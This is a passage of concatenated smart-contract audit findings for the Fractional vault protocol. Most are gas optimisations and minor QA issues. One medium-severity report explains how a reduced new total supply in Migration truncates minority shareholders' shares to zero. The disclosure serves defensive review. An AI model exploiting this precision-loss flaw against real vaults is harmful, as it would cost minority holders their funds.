IFERC1155(token).setApprovalFor(address(buyout), id, true); +208:             IFERC1155(token).setApprovalFor(buyout, id, true); ```   # Scientific notation  ## PROBLEM  For readability, it is best to use scientific notation (e.g `10e5`) rather than decimal literals(`100000`) or exponentiation(`10**5`)  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### src/modules/Buyout.sol  ```cpp 208:         if ( 209:             (tokenBalance * 1000) / ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `1000` with `10e3`  # Signature malleability  ## PROBLEM  `permit` and `permitAll` in `FERC1155` use Solidity's `ecrecover` to verify signatures. The EVM opcode associated with this function allows for malleable signatures and thus is susceptible to replay attacks. There is no direct threat to the protocol - these functions only approve operators - but it is still a good practice to avoid signature malleability.    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  2 instances:   ### src/FERC1155.sol  ```cpp 126:             address signer = ecrecover(digest, _v, _r, _s); ```  ```cpp 171:             address signer = ecrecover(digest, _v, _r, _s); ```    ## TOOLS USED  Manual Analysis    ## MITIGATION  Use OpenZeppelin's `ECDSA`'s [library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)    # TODOS  ## PROBLEM  There is an open TODO in `MerkleBase.sol`. It is merely a gas optimisation issue, but it should still be resolved before contract deployments    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### src/utils/MerkleBase.sol  ```cpp 24:             // TODO: This can be aesthetically simplified with a switch. Not sure it will 25:             // save much gas but there are other optimizations to be had in here. ```    ## TOOLS USED  Manual Analysis    ## MITIGATION  Remove the TODO comment    # Visibility should be explicit  ## PROBLEM  Visibility of variables should be explicitly set.  ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  2 instances:   ### src/references/SupplyReference.sol  ```cpp 12:     address immutable registry; ```  ### src/targets/Supply.sol  ```cpp 13:     address immutable registry; ```    ## TOOLS USED  Manual Analysis  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L469-L472 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L95-L98   # Vulnerability details  As new total supply can be arbitrary, setting it significantly lower than current (say to 100 when it was 1e9 before) can be used to remove current minority shareholders, whose shares will end up being zero on a precision loss due to low new total supply value. This can go unnoticed as the effect is implementation based.  During Buyout the remaining shareholders are left with ETH funds based valuation and can sell the shares, but the minority shareholders that did contributed to the Migration, that could have other details favourable to them, may not realize that new shares will be calculated with the numerical truncation as a result of the new total supply introduction.  Setting the severity to medium as this is a fund loss impact conditional on a user not understanding the particulars of the implementation.  ## Proof of Concept  Currently migrateFractions() calculates new shares to be transferred for a user as a fraction of her contribution:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L469-L472  ```solidity         // Calculates share amount of fractions for the new vault based on the new total supply         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);         uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /             totalInEth; ```  If Bob the msg.sender is a minority shareholder who contributed to Migration with say some technical enhancements of the Vault, not paying attention to the total supply reduction, his share can be lost on commit():  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L209-L210  ```solidity             // Starts the buyout process             IBuyout(buyout).start{value: proposal.totalEth}(_vault); ```  As commit() starts the Buyout, Bob will not be able to withdraw as both leave() and withdrawContribution() require INACTIVE state:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L149-L150  ```solidity         State required = State.INACTIVE;         if (current != required) revert IBuyout.InvalidState(required, current); ```  If Buyout be successful, Bob's share can be calculated as zero given his small initial share and reduction in the Vault total shares.  For example, if Bob's share together with the ETH funds he provided to Migration were cumulatively less than 1%, and new total supply is 100, he will lose all his contribution on commit() as migrateFractions() will send him nothing.  ## Recommended Mitigation Steps  Consider requiring that the new total supply should be greater than the old one:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L95-L98  ```solidity         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply; +       require(proposal.newFractionSupply > proposal.oldFractionSupply, ""); // reference version ```  
# Table of contents  - **[[0x0] Disclaimer](#0x0)** - **[[G-01] Try ++i instead of i++](G-01)** - **[[G-02] Try `unchecked{++i}` instead of `i++` in loops](G-02)** - **[[G-03] Consider `a = a + b` instead of `a += b`](G-03)** - **[[G-04] Consider marking onlyOwner functions as payable](G-04)** - **[[G-05] Use binary shifting instead of `a / 2^x, x > 0`](G-05)** - **[[G-06] Cache state variables, `MLOAD` << `SLOAD`](G-06)** - **[[G-07] Declare `immutable` instead of state variables](G-07)** - **[[G-08] Define `constants/immutable/state` as `private/internal`](G-08)** - **[[G-09] Check out `calldataloud` vs `mload`](G-09)** - **[[G-10] `Internal` functions can be inlined](G-10)** - **[[G-11] Functions are invoked inside the SC should be marked as internal](G-11)** - **[[G-12] Redundant gas usage](G-12)** - **[[G-13] Remove unnecessary explicit casts](G-13)**    ## Disclaimer<a name="0x0"></a> - Please, consider everything described below as a general recommendation. These notes will represent potential possibilities to optimize gas consumption. It's okay, if something is not suitable in your case. Just let me know the reason in the comments section. Enjoy!   ## **[G-01] Try ++i instead of i++**<a name="G-01"></a>  ### ***Description:***   - In case of i++, the compiler needs to create a temp variable to return and then it gets incremented.     - In case of ++i, the compiler just simply returns already incremented value.  ### ***Recommendations:***   - Use prefix increment instead of postfix.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/Vault.sol       ...............................                // Lines: [78-78]         for (uint256 i = 0; i < length; i++) {}          // Lines: [104-104]         for (uint256 i = 0; i < length; i++) {}      ```  ## **[G-02] Try `unchecked{++i};` instead of `i++;` in loops**<a name="G-02"></a>  ### ***Description:***   - If the for loop runs 100 times, it's about 10k units of gas which can be saved in comparison. Don't worry about overflow, when the number is just simply getting incremented by 1. There are ~1e80 atoms in the universe, so 2^256 is closed to that number, therefore it's no a way to be overflowed, because of the gas limit as well.     ### ***Recommendations:***   - Try to use unchecked{} box where it's no a way to get a overflow/underflow. Significant gas usage optimization.  ### ***All occurances:***    - Contracts:      ```Solidity       file: src/Vault.sol       ...............................                // Lines: [78-78]           for (uint256 i = 0; i < length; i++) {}          // Lines: [104-104]           for (uint256 i = 0; i < length; i++) {}      ``` ## **[G-03] Consider `a = a + b` instead of `a += b`**<a name="G-03"></a>  ### ***Description:***   - It has an impact on the deployment cost and the cost for distinct transaction.    ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [86-86]           totalSupply[_id] += _amount;          // Lines: [270-271]           balanceOf[_from][_id] -= _amount;           balanceOf[_to][_id] += _amount;        file: src/Buyout.sol       ...............................          // Lines: [176-176]           buyoutInfo[_vault].ethBalance += msg.value;          // Lines: [139-139]           buyoutInfo[_vault].ethBalance -= ethAmount;        file: src/Migration.sol       ...............................          // Lines: [123-124]           proposal.totalEth += msg.value;           userProposalEth[_proposalId][msg.sender] += msg.value;          // Lines: [134-135]           proposal.totalFractions += _amount;           userProposalFractions[_proposalId][msg.sender] += _amount;                    // Lines: [156-156]           proposal.totalFractions -= amount;          // Lines: [160-160]           proposal.totalEth -= ethAmount;          // Lines: [497-497]           treeLength += IModule(_modules[i]).getLeafNodes().length;        file: src/MerkleBase.sol       ...............................          // Lines: [147-147]           for (uint256 i; i < length - 1; i += 2) {}          // Lines: [190-190]           ceil -= pOf2; // see above   ## **[G-04] Consider marking onlyOwner functions as payable**<a name="G-04"></a>  ### ***Description:***   - A little optmization in comparison between payable and non-payable functions. Also, there is a little tradeoff here between readability and optimization.  ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [56-63]           function burn(               address _from,               uint256 _id,               uint256 _amount           ) external onlyRegistry {}          // Lines: [79-87]           function mint(               address _to,               uint256 _id,               uint256 _amount,               bytes memory _data           ) external onlyRegistry {}          // Lines: [198-200]           function setContractURI(string calldata _uri) external onlyController {}          // Lines: [205-211]           function setMetadata(address _metadata, uint256 _id)               external               onlyController           {}          // Lines: [217-225]           function setRoyalties(               uint256 _id,               address _receiver,               uint256 _percentage           ) external onlyController {}          // Lines: [229-232]           function transferController(address _newController)               external               onlyController           {}         ``` ## **[G-05] Use binary shifting instead of `a / 2^x, x > 0`**<a name="G-05"></a>  ### ***Description:***   - It's also pretty impactful approach especially in loops.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/MerkleBase.sol       ...............................                // Lines: [100-100]           _node = _node / 2;          // Lines: [136-136]           result = new bytes32[](length / 2 + 1);          // Lines: [142-142]           result = new bytes32[](length / 2);       ``` ## **[G-06] Cache state variables, `MLOAD` << `SLOAD`**<a name="G-06"></a>  ### ***Description:***   - `MLOAD` costs only 3 units of gas, `SLOAD`(warm access) is about 100 units. Therefore, cache, when it's possible.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................          // Lines: [91-91]           if (msg.sender != metadata[_id])             revert InvalidSender(metadata[_id], msg.sender);           // Lines: [297-298]           if (msg.sender != metadata[_id])             revert InvalidSender(metadata[_id], msg.sender);          // Lines: [303-305]           _controller == address(0)               ? controllerAddress = INITIAL_CONTROLLER()               : controllerAddress = _controller;        file: src/Bayout.sol       ...............................         // Lines: [176-176]           buyoutInfo[_vault].ethBalance += msg.value;         file: src/Vault.sol       ...............................          // Lines: [25-25]           if (nonce != 0) revert Initialized(owner, msg.sender, nonce);          // Lines: [76, 87, 94, 102]           if (owner != msg.sender) revert NotOwner(owner, msg.sender);          // Lines: [132-132]           if (owner_ != owner) revert OwnerChanged(owner_, owner);        file: src/Migration.sol       ...............................          // Lines: [126-127; 137-138]           // Comment:             - proposal.totalEth += msg.value => proposal.totalEth = proposal.totalEth(SLOAD) + msg.value;                  - proposal.totalEth = proposal.totalEth(which you can store in memory to avoid SLOAD) + msg.value.               proposal.totalEth += msg.value;             userProposalEth[_proposalId][msg.sender] += msg.value;                proposal.totalFractions += _amount;             userProposalFractions[_proposalId][msg.sender] += _amount;          file: src/Buyout.sol         ...............................           // Lines: [474-502]               permissions[0] = Permission(               address(this),               supply,               ISupply(supply).burn.selector             );             permissions[1] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC20Transfer.selector             );             permissions[2] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC721TransferFrom.selector             );             permissions[3] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC1155TransferFrom.selector             );             permissions[4] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC1155BatchTransferFrom.selector             );          ```  ## **[G-07] Declare `immutable` instead of state variables**<a name="G-07"></a>  ### ***Description:***   - Since it's initialized once, there is no reason for state variable allocation.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [19-19]           address internal _controller;          // Lines: [21-21]           string public contractURI;          // Lines: [142-142]           result = new bytes32[](length / 2);        file: src/Vault.sol       ...............................         // Lines: [15-15]           bytes32 public merkleRoot;          // Lines: [17-17]           uint256 public nonce;        file: src/VaultFactory.sol       ...............................         // Lines: [15-15]           address public implementation;        file: src/Buyout.sol       ...............................         // Lines: [29-33]           address public registry;           address public supply;           address public transfer;        ``` ## **[G-08] Define public `constants/immutable/state` as `private/internal`**<a name="G-08"></a>  ### ***Description:***   - Declaring state variables as private/internal doesn't generate getter functions.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [15-17]           string public constant NAME = "FERC1155";           string public constant VERSION = "1";          // Lines: [21-21]           string public contractURI;          // Lines: [23-30]           mapping(address => mapping(address => mapping(uint256 => bool)))         public isApproved;           /// @notice Mapping of metadata contracts for token ID types => metadata address           mapping(uint256 => address) public metadata;           /// @notice Mapping to track account nonces for metadata txs owner => nonces           mapping(address => uint256) public nonces;           /// @notice Mapping to track total supply for token ID types => totalSupply           mapping(uint256 => uint256) public totalSupply;        file: src/Vault.sol       ...............................         // Lines: [21-21]           mapping(bytes4 => address) public methods;        file: src/VaultRegistry.sol       ...............................         // Lines: [17-21]           address public immutable factory;           address public immutable fNFT;           address public immutable fNFTImplementation;          // Lines: [23-25]           mapping(address => uint256) public nextId;           mapping(address => VaultInfo) public vaultToToken;        file: src/Buyout.sol       ...............................         // Lines: [35-38]           uint256 public constant PROPOSAL_PERIOD = 2 days;           uint256 public constant REJECTION_PERIOD = 4 days;           mapping(address => Auction) public buyoutInfo;     ``` ## **[G-09] Check out `calldataloud` vs `mload`**<a name="G-09"></a>  ### ***Description:***   - Consider reading args directly from calldata instead of memory, if args doesn't require any changes.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [68-68]           function emitSetURI(uint256 _id, string memory _uri) external {}          // Lines: [79-79]         // Comments: OZ marked `bytes memory _data`, it is because those functions are virtual, hence could be overrided. Therefore, allowing modifying args for those overrided versions. Here, we just have an external function, therefore it's better to read bytes directly from calldata, especially, if the `_data` is a massive flow.             function mint(               address _to,               uint256 _id,               uint256 _amount,               bytes memory _data           ) external onlyRegistry {}          // Lines: [68-68]           function emitSetURI(uint256 _id, string memory _uri) external {}        file: src/Vault.sol       ...............................                // Lines: [73-75]           function install(bytes4[] memory _selectors, address[] memory _plugins)               external           {}         // Lines: [101-101]           function uninstall(bytes4[] memory _selectors) external {}        file: src/VaultRegistry.sol       ...............................                // Lines: [51-54]           function create(               bytes32 _merkleRoot,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [67-72]           function createFor(               bytes32 _merkleRoot,               address _owner,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [67-72]           function createCollection(             bytes32 _merkleRoot,             address[] memory _plugins,             bytes4[] memory _selectors         ) external returns (address vault, address token) {}          // Lines: [102-107]           function createInCollection(               bytes32 _merkleRoot,               address _token,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [147-152]           function createCollectionFor(               bytes32 _merkleRoot,               address _controller,               address[] memory _plugins,               bytes4[] memory _selectors           ) public returns (address vault, address token) {}          // Lines: [165-170]           function _deployVault(               bytes32 _merkleRoot,               address _token,               address[] memory _plugins,               bytes4[] memory _selectors           ) private returns (address vault) {}        file: src/Buyout.sol       ...............................           function batchWithdrawERC1155(               address _vault,               address _token,               address _to,               uint256[] calldata _ids,               uint256[] calldata _values,               bytes32[] calldata _erc1155BatchTransferProof           ) external {}            // Look, how beatufil it looks like with calldata. Thank you for that!!!!!!!      ``` ## **[G-10] `Internal` functions can be inlined**<a name="G-10"></a>  ### ***Description:***   - It takes some extra `JUMP`s which costs around 12 gas uints for each `JUMP`.     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [324-330]           function _computePermitStructHash(               address _owner,               address _operator,               uint256 _id,               bool _approved,               uint256 _deadline           ) internal returns (bytes32) {}          // Lines: [350-355]           function _computePermitAllStructHash(               address _owner,               address _operator,               bool _approved,               uint256 _deadline           ) internal returns (bytes32) {}          // Lines: [371-371]           function _computeDomainSeparator() internal view returns (bytes32) {}          // Lines: [388-392]           function _computeDigest(bytes32 _domainSeparator, bytes32 _structHash)               internal               pure               returns (bytes32)           {}      ``` ## **[G-11] Functions which are invoked inside the SC should be marked as internal**<a name="G-11"></a>  ### ***Description:***   - If i'm not mistaken, these getter functions should be defined as internal.     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [309-316]             function INITIAL_CONTROLLER() public pure returns (address) {               return _getArgAddress(0);             }              function VAULT_REGISTRY() public pure returns (address) {                 return _getArgAddress(20);             }       ``` ## **[G-12] Redundant gas usage**<a name="G-12"></a>  ### ***Description:***   - Extra gas usage without the reason, use _selectors.length in loops.    ### ***All occurances:***    - Contracts:        ```Solidity       file: src/Vault.sol       ...............................                // Lines: [77-77]           uint256 length = _selectors.length;          // Lines: [103-103]           uint256 length = _selectors.length;        ``` ## **[G-13] Remove unnecessary explicit casts**<a name="G-13"></a>  ### ***Description:***   - There is no reason to explicitly cast `address` to `address`, etc...     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/VaultRegistry.sol       ...............................                // Lines: [73-73]           vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);          // Lines: [56-56]           vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);          // Lines: [154-154]           abi.encodePacked(_controller, address(this))       ```  ## Kudos for the quality of the code! It's pretty easy to explore! 
## FINDINGS ### Using immutable on variables that are only set in the constructor and never after   File: Migration.sol  [line 39](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L39)  ```     address public registry; ```  The above is only set in the constructor and never set again  File: Migration.sol [line 37](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L37)  ```     address payable public buyout; ``` File: Buyout.sol [line 29](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L29)  ```     address public registry; ```  File: Buyout.sol [line 31](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L31)  ```     address public supply; ```  File: Buyout.sol [line 33](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L33)  ```     address public transfer; ```  File: BaseVault.sol [line 19](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L19)  ```     address public registry; ``` ### Using unchecked blocks to save gas - Increments in for loop can be unchecked  ( save 30-40 gas per loop iteration) The majority of Solidity for loops increment a uint256 variable that starts at 0. These increment operations never need to be checked for over/underflow because the variable will never reach the max number of uint256 (will run out of gas long before that happens). The default over/underflow check wastes gas in every iteration of virtually every for loop . eg.  e.g Let's work with a sample loop below.  ``` for(uint256 i; i < 10; i++){ //doSomething }  ``` can be written as shown below. ``` for(uint256 i; i < 10;) {   // loop logic   unchecked { i++; } } ```  We can also write  it as an inlined function like below.  ``` function inc(i) internal pure returns (uint256) {   unchecked { return i + 1; } } for(uint256 i; i < 10; i = inc(i)) {   // doSomething } ```  **Affected code** File: Vault.sol  [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)  ```         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         } ```  The above should be modified to:  ```         for (uint256 i = 0; i < length; {             methods[_selectors[i]] = _plugins[i];   unchecked{     ++i;   }         } ``` **Other Instances to modify** File: Vault.sol [line 104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)  ```         for (uint256 i = 0; i < length; i++) { ``` [see resource](https://github.com/ethereum/solidity/issues/10695)  ### Cache storage values in memory to minimize SLOADs The code can be optimized by minimizing the number of SLOADs. SLOADs are expensive 100 gas compared to MLOADs/MSTOREs(3gas) Storage value should get cached in memory   NB: *Some functions have been truncated where necessary to just show affected parts of the code*  #### Migration.sol.propose() : registry should be cached (saves ~ 92 gas) File: Migration.sol [line 81-95](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L72-L99)  ```     function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);                 // Initializes migration proposal info            proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply;     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 81](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L81) SLOAD 2: [line 95](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L95)  #### Migration.sol.migrateFractions() : registry should be cached  (saves ~ 372 gas) File: Migration.sol [line 435,467,470](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L433-L482)  ```     function migrateFractions(address _vault, uint256 _proposalId) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);                 // Gets the token and fraction ID of the new vault         address newVault = migrationInfo[_vault][_proposalId].newVault;         (address token, uint256 newFractionId) = IVaultRegistry(registry)             .vaultToToken(newVault);         // Calculates share amount of fractions for the new vault based on the new total supply         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);         uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /             totalInEth;          );     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 435](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L435) SLOAD 2: [line 467](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L467) SLOAD 3: [line 470](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L470)  #### Migration.sol.migrateFractions() : registry should be cached  (saves ~ 101 gas) File:Migration.sol [line 184,200](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L179-L214)  ```     function commit(address _vault, uint256 _proposalId)         external         returns (bool started)     {         // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );         // Calculates current price of the proposal based on total supply         uint256 currentPrice = _calculateTotal(             100,             IVaultRegistry(registry).totalSupply(_vault),             proposal.totalEth,             proposal.totalFractions         );      } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 184](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L184) SLOAD 2: [line 200](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L200)   #### Buyout.sol.start() : registry should be cached (saves ~ 83 gas) File:Buyout.sol [line 61-71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L57-L73)  ```     function start(address _vault) external payable {                 // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );        ...         // Gets total supply of fractional tokens for the vault         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);         // Gets total balance of fractional tokens owned by caller         uint256 depositAmount = IERC1155(token).balanceOf(msg.sender, id); ```  In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1:  [line 61](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L61) and the SLOAD 2:  [line 71](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L71)  #### Buyout.sol.cash() : registry should be cached (saves ~ 84 gas) File: Buyout.sol [line 246-267](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L244-L273)  ```     function cash(address _vault, bytes32[] calldata _burnProof) external {         // Reverts if address is not a registered vault         (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(             _vault         );       ...         // Transfers buyout share amount to caller based on total supply         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);         uint256 buyoutShare = (tokenBalance * ethBalance) /             (totalSupply + tokenBalance);         _sendEthOrWeth(msg.sender, buyoutShare);         // Emits event for cashing out of buyout pool         emit Cash(_vault, msg.sender, buyoutShare);     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1:  [line 246](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L246) and the SLOAD 2:  [line 267](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L267)  #### Buyout.sol.redeem() : registry should be cached (saves ~97 gas) File: Buyout.sol [line 280-288](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L278-L288)  ```     function redeem(address _vault, bytes32[] calldata _burnProof) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);         if (id == 0) revert NotVault(_vault);         // Reverts if auction state is not inactive         (, , State current, , , ) = this.buyoutInfo(_vault);         State required = State.INACTIVE;         if (current != required) revert InvalidState(required, current);           // Initializes vault transaction         uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault); ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1 : [line 280](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L280) and the SLOAD 2 : [line 288](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L288)   #### FERC1155.sol.uri() : metadata[\_uri] should be cached File: FERC1155.sol [line 297-298](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L291-L299)  ```     function uri(uint256 _id)         public         view         override(ERC1155, IFERC1155)         returns (string memory)     {         require(metadata[_id] != address(0), "NO METADATA"); @audit : SLOAD 1 metadata[_id]         return IFERC1155(metadata[_id]).uri(_id);@audit : SLOAD 2 metadata[_id]     } ``` SLOAD 1:  in the require statement [line 297](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L297) costing 100 gas  SLOAD 2:  in the return statement [line 298](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L298) again costing 100gas  We can cache `metadata[_id]` in memory and read the value from memory instead of from storage    ### Help the optimizer by saving a storage variable's reference instead of repeatedly fetching migrationInfo[\_vault][\_proposalId] Declare a **Storage**  variable and use it instead of fetching the reference in the map repeatedly.  Instead of calling `migrationInfo[_vault][_proposalId]` everytime save it's reference like shown below and use the reference.  ```   Proposal storage proposal = migrationInfo[_vault][_proposalId]; ``` File: Migration.sol [line 454-456](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L433-L468)  ```     function migrateFractions(address _vault, uint256 _proposalId) external {               // Calculates the total ether amount of a successful proposal         uint256 totalInEth = _calculateTotal(             1 ether,             lastTotalSupply,             migrationInfo[_vault][_proposalId].totalEth,             migrationInfo[_vault][_proposalId].totalFractions         );         // Calculates balance of caller based on ether contribution         uint256 balanceContributedInEth = _calculateContribution(             totalInEth,             lastTotalSupply,             userProposalEth[_proposalId][msg.sender],             userProposalFractions[_proposalId][msg.sender]         );          // Gets the token and fraction ID of the new vault         address newVault = migrationInfo[_vault][_proposalId].newVault;         ``` In the above function, `migrationInfo[_vault][_proposalId]` is being fetched 3 times  in the following lines  1: [line 454](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L454) 2: [line 455](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L455) 3: [line 466](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L466)  Something similar to my proposal has already been implemented on [line 266](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L266)   ### Cache the length of arrays in loops (saves ~6 gas per iteration) Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  The solidity compiler will always read the length of the array during each iteration. That is,     1.if it is a storage array, this is an extra sload operation (100 additional extra gas (EIP-2929 2) for each iteration except for the first),    2.if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first),    3.if it is a calldata array, this is an extra calldataload operation (3 additional gas for each iteration except for the first)  This extra costs can be avoided by caching the array length (in stack):  When reading the length of an array,  **sload** or **mload** or **calldataload** operation is only called once and subsequently replaced by a cheap **dupN** instruction. Even though mload , calldataload and dupN have the same gas cost, mload and calldataload needs an additional dupN to put the offset in the stack, i.e., an extra 3 gas. which brings this to 6 gas   Here, I suggest storing the array’s length in a variable before the for-loop, and use it instead:  File: MerkleBase.sol [line 51](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51)  ```             for (uint256 i = 0; i < 